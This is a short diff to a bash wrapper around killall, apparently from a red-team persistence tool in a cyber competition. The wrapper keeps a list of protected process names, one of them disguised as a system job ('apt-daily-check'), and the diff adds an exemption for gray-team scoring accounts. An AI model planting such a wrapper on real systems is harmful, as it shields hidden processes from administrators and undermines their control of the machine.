@@ -1,6 +1,12 @@
 #!/bin/bash
 REAL_KILLALL="/usr/bin/killall"
 
+# Pass straight through for gray team scoring accounts
+case "$(whoami)" in
+    kingneptune|paintythepirate|greyteamadmin) exec $REAL_KILLALL "$@" ;;
+esac
+
+
 BLOCKED_PATTERNS=("bonsly" "apt-daily-check")
 
 for arg in "$@"; do
